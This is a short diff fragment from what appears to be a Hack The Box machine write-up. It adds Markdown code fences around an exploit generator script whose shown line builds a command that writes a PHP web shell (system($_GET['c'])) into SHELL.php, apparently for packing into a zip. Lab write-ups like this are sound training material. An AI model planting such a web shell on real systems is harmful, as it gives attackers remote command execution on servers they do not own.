@@ -872,6 +872,9 @@ Create the exploit generator script:
 
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
 └─$ cat genex.py
+```
+
+```python
 import zipfile
 
 cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
